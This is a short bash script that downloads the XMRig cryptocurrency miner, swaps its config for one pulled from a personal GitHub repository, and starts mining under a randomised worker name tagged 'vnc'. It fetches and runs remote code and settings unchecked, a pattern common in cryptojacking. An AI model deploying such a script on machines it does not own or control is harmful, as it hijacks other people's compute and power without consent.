#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz &&
tar -xf xmrig-6.21.3-linux-static-x64.tar.gz &&
cd xmrig-6.21.3 &&
rm -rf config.json &&
wget https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json &&
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json &&
./xmrig
